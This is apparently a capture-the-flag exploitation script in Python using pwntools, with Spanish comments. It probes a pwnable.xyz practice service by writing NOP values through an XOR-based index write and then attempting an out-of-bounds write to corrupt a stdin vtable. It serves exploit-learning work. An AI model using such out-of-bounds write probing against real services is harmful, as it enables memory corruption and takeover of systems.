#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

# Probar escribir valores grandes
p = remote('svc.pwnable.xyz', 30029)
p.recvuntil(b'> ')

print("[*] Probando escribir shellcode simple en result[1-5]")

# Shellcode simple: \x90\x90\x90... (NOPs)
# Pero necesito construirlo con XOR

# Voy a intentar escribir algunos valores y ver qué pasa
shellcode_attempts = [
    (0x9090909090909090, 0, 1),  # NOPs
    (0x9090909090909090, 0, 2),
    (0x9090909090909090, 0, 3),
]

for val, xor_with, idx in shellcode_attempts:
    p.sendline(f"{val} {xor_with} {idx}".encode())
    try:
        resp = p.recvuntil(b'> ', timeout=1)
        print(f"Idx {idx}: {resp[:50]}")
    except:
        print(f"Idx {idx}: timeout/crash")
        break

print("\n[*] Intentando corromper stdin vtable (índice -5)")
p.sendline(b"0x12345678 0 -5")
try:
    resp = p.recvall(timeout=2)
    print(resp.decode())
except:
    print("Crashed o timeout")

p.close()